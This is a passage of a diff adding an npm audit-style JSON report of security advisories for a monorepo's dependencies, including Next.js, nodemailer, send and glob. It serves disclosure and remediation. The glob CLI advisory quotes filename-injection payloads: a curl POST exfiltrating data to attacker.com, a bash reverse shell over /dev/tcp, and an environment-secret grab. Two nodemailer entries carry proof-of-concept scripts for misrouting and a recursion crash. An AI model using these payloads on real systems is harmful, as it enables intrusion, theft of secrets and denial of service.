+      "overview": "## Summary\n\nA low-severity vulnerability in **Next.js** has been fixed in **version 15.2.2**. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while `npm run dev` is active.\n\nBecause the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure `allowedDevOrigins` in your next config after upgrading to a patched version. [Learn more](https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins).\n\nLearn more: https://vercel.com/changelog/cve-2025-48068\n\n## Credit\n\nThanks to [sapphi-red](https://github.com/sapphi-red) and [Radman Siddiki](https://github.com/R4356th) for responsibly disclosing this issue.",
+      "reported_by": null,
+      "title": "Information exposure in Next.js dev server due to lack of origin verification",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48068"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0 <14.2.30",
+      "github_advisory_id": "GHSA-3h52-269p-cp9r",
+      "recommendation": "Upgrade to version 14.2.30 or later",
+      "patched_versions": ">=14.2.30",
+      "updated": "2025-06-13T14:41:22.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1385"
+      ],
+      "url": "https://github.com/advisories/GHSA-3h52-269p-cp9r"
+    },
+    "1107226": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g5qg-72qw-gw5v\n- https://github.com/vercel/next.js/pull/82114\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- https://vercel.com/changelog/cve-2025-57752\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57752\n- https://github.com/advisories/GHSA-g5qg-72qw-gw5v",
+      "created": "2025-08-29T22:06:22.000Z",
+      "id": 1107226,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.\n\nAll users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)",
+      "reported_by": null,
+      "title": "Next.js Affected by Cache Key Confusion for Image Optimization API Routes",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57752"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.31",
+      "github_advisory_id": "GHSA-g5qg-72qw-gw5v",
+      "recommendation": "Upgrade to version 14.2.31 or later",
+      "patched_versions": ">=14.2.31",
+      "updated": "2025-09-03T13:01:55.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-g5qg-72qw-gw5v"
+    },
+    "1107512": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4342-x723-ch2f\n- https://github.com/vercel/next.js/commit/9c9aaed5bb9338ef31b0517ccf0ab4414f2093d8\n- https://vercel.com/changelog/cve-2025-57822\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57822\n- https://github.com/advisories/GHSA-4342-x723-ch2f",
+      "created": "2025-08-29T21:33:09.000Z",
+      "id": 1107512,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.\n\nAll users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)",
+      "reported_by": null,
+      "title": "Next.js Improper Middleware Redirect Handling Leads to SSRF",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57822"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.32",
+      "github_advisory_id": "GHSA-4342-x723-ch2f",
+      "recommendation": "Upgrade to version 14.2.32 or later",
+      "patched_versions": ">=14.2.32",
+      "updated": "2025-09-11T15:41:03.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-4342-x723-ch2f"
+    },
+    "1107513": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-xv57-4mr9-wg8v\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- http://vercel.com/changelog/cve-2025-55173\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55173\n- https://vercel.com/changelog/cve-2025-55173\n- https://github.com/advisories/GHSA-xv57-4mr9-wg8v",
+      "created": "2025-08-29T21:59:55.000Z",
+      "id": 1107513,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.\n\nAll users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)",
+      "reported_by": null,
+      "title": "Next.js Content Injection Vulnerability for Image Optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55173"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.31",
+      "github_advisory_id": "GHSA-xv57-4mr9-wg8v",
+      "recommendation": "Upgrade to version 14.2.31 or later",
+      "patched_versions": ">=14.2.31",
+      "updated": "2025-09-11T15:35:25.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-xv57-4mr9-wg8v"
+    },
+    "1108291": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-qpjv-v59x-3qc4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32421\n- https://vercel.com/changelog/cve-2025-32421\n- https://github.com/advisories/GHSA-qpjv-v59x-3qc4",
+      "created": "2025-05-15T14:12:26.000Z",
+      "id": 1108291,
+      "npm_advisory_id": null,
+      "overview": "**Summary**  \nWe received a responsible disclosure from Allam Rachid (zhero) for a low-severity race-condition vulnerability in Next.js. This issue only affects the **Pages Router** under certain misconfigurations, causing normal endpoints to serve `pageProps` data instead of standard HTML.\n\n[Learn more here](https://vercel.com/changelog/cve-2025-32421)\n\n**Credit**  \nThank you to **Allam Rachid (zhero)** for the responsible disclosure. This research was rewarded as part of our bug bounty program.",
+      "reported_by": null,
+      "title": "Next.js Race Condition to Cache Poisoning",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-32421"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.24",
+      "github_advisory_id": "GHSA-qpjv-v59x-3qc4",
+      "recommendation": "Upgrade to version 14.2.24 or later",
+      "patched_versions": ">=14.2.24",
+      "updated": "2025-09-26T17:48:30.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-qpjv-v59x-3qc4"
+    },
+    "1108316": {
+      "findings": [
+        {
+          "version": "1.10.4",
+          "paths": [
+            "apps/admin > @privy-io/react-auth@1.99.1 > web3-core@1.10.4 > web3-core-method@1.10.4 > web3-core-subscriptions@1.10.4",
+            "apps/admin > @privy-io/wagmi-connector@0.1.13 > @privy-io/react-auth@1.99.1 > web3-core@1.10.4 > web3-core-method@1.10.4 > web3-core-subscriptions@1.10.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-57330\n- https://github.com/VulnSageAgent/PoCs/blob/main/JavaScript/prototype-pollution/web3-core-subscriptions%401.10.4/index.js\n- https://github.com/VulnSageAgent/PoCs/tree/main/JavaScript/prototype-pollution/CVE-2025-57330\n- https://github.com/web3/web3.js/commit/d9660426c12210c5071aeb4e1a647c6ea9d67b12\n- https://github.com/advisories/GHSA-hhf6-3xpg-pggx",
+      "created": "2025-09-24T21:30:37.000Z",
+      "id": 1108316,
+      "npm_advisory_id": null,
+      "overview": "The web3-core-subscriptions is a package designed to manages web3 subscriptions. A Prototype Pollution vulnerability in the attachToObject function of web3-core-subscriptions version 1.10.4 and before allows attackers to inject properties on Object.prototype via supplying a crafted payload, causing denial of service (DoS) as the minimum consequence.",
+      "reported_by": null,
+      "title": "web3-core-subscriptions has a Prototype Pollution vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57330"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "web3-core-subscriptions",
+      "vulnerable_versions": "<=2.0.0-alpha.1",
+      "github_advisory_id": "GHSA-hhf6-3xpg-pggx",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-09-25T16:46:21.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-hhf6-3xpg-pggx"
+    },
+    "1108953": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\n- https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\n- https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29927\n- https://github.com/vercel/next.js/releases/tag/v12.3.5\n- https://github.com/vercel/next.js/releases/tag/v13.5.9\n- https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\n- http://www.openwall.com/lists/oss-security/2025/03/23/3\n- http://www.openwall.com/lists/oss-security/2025/03/23/4\n- https://security.netapp.com/advisory/ntap-20250328-0002\n- https://github.com/advisories/GHSA-f82v-jwr5-mffw",
+      "created": "2025-03-21T15:20:12.000Z",
+      "id": 1108953,
+      "npm_advisory_id": null,
+      "overview": "# Impact\nIt is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.\n\n# Patches\n* For Next.js 15.x, this issue is fixed in `15.2.3`\n* For Next.js 14.x, this issue is fixed in `14.2.25`\n* For Next.js 13.x, this issue is fixed in 13.5.9\n* For Next.js 12.x, this issue is fixed in 12.3.5\n* For Next.js 11.x, consult the below workaround.\n\n_Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability._\n\n# Workaround\nIf patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.\n\n## Credits\n\n- Allam Rachid (zhero;)\n- Allam Yasser (inzo_)",
+      "reported_by": null,
+      "title": "Authorization Bypass in Next.js Middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-29927"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.25",
+      "github_advisory_id": "GHSA-f82v-jwr5-mffw",
+      "recommendation": "Upgrade to version 14.2.25 or later",
+      "patched_versions": ">=14.2.25",
+      "updated": "2025-10-13T15:32:09.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-285",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
+    },
+    "1109556": {
+      "findings": [
+        {
+          "version": "0.18.0",
+          "paths": [
+            "apps/mobile > expo@50.0.21 > @expo/cli@0.17.13 > send@0.18.0",
+            "apps/mobile > expo-router@3.4.10 > expo@50.0.21 > @expo/cli@0.17.13 > send@0.18.0",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > expo@50.0.21 > @expo/cli@0.17.13 > send@0.18.0",
+            "apps/mobile > expo-router@3.4.10 > expo-splash-screen@0.26.5 > expo@50.0.21 > @expo/cli@0.17.13 > send@0.18.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43799\n- https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35\n- https://lists.debian.org/debian-lts-announce/2025/06/msg00022.html\n- https://github.com/advisories/GHSA-m6fv-jmcg-4jfg",
+      "created": "2024-09-10T19:42:41.000Z",
+      "id": 1109556,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template",
+      "reported_by": null,
+      "title": "send vulnerable to template injection that can lead to XSS",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-43799"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "send",
+      "vulnerable_versions": "<0.19.0",
+      "github_advisory_id": "GHSA-m6fv-jmcg-4jfg",
+      "recommendation": "Upgrade to version 0.19.0 or later",
+      "patched_versions": ">=0.19.0",
+      "updated": "2025-11-03T22:48:05.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-m6fv-jmcg-4jfg"
+    },
+    "1109804": {
+      "findings": [
+        {
+          "version": "6.10.1",
+          "paths": [
+            "apps/admin > @castquest/core-services@link:../../packages/core-services > nodemailer@6.10.1",
+            "packages/core-services > nodemailer@6.10.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13033\n- https://access.redhat.com/security/cve/CVE-2025-13033\n- https://bugzilla.redhat.com/show_bug.cgi?id=2402179\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+      "created": "2025-10-07T13:42:02.000Z",
+      "id": 1109804,
+      "npm_advisory_id": null,
+      "overview": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+      "reported_by": null,
+      "title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13033"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<7.0.7",
+      "github_advisory_id": "GHSA-mm7p-fcc7-pg87",
+      "recommendation": "Upgrade to version 7.0.7 or later",
+      "patched_versions": ">=7.0.7",
+      "updated": "2025-11-17T17:29:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+    },
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.3.10",
+          "paths": [
+            "packages/frames > eslint-config-next@14.2.35 > @next/eslint-plugin-next@14.2.35 > glob@10.3.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1111074": {
+      "findings": [
+        {
+          "version": "6.10.1",
+          "paths": [
+            "apps/admin > @castquest/core-services@link:../../packages/core-services > nodemailer@6.10.1",
+            "packages/core-services > nodemailer@6.10.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+      "created": "2025-12-01T20:44:25.000Z",
+      "id": 1111074,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",
+      "reported_by": null,
+      "title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<=7.0.10",
+      "github_advisory_id": "GHSA-rcmh-qjqh-p98v",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-01T20:44:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+    },
+    "1111391": {
+      "findings": [
+        {
